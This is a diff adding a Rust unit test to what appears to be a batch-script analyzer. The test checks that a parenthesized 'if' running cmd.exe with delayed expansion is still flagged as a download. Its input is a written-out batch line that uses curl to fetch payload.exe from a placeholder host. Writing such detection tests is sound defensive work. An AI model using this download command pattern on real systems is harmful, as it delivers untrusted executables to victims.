@@ -5448,6 +5448,23 @@ mod if_tests {
     }
 
     #[test]
+    fn parenthesized_if_cmd_child_preserves_delayed_expansion() {
+        let script = br#"if "a"=="a" (cmd.exe /V:ON /c "set U=https://if-paren.example/payload.exe&&curl -o payload.exe !U!")"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://if-paren.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "parenthesized if cmd child did not preserve delayed expansion: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn if_single_quoted_string_eq_runs_body() {
         let script = b"if 'a'=='a' echo match\r\n";
         let report = analyze(script, &Config::default());
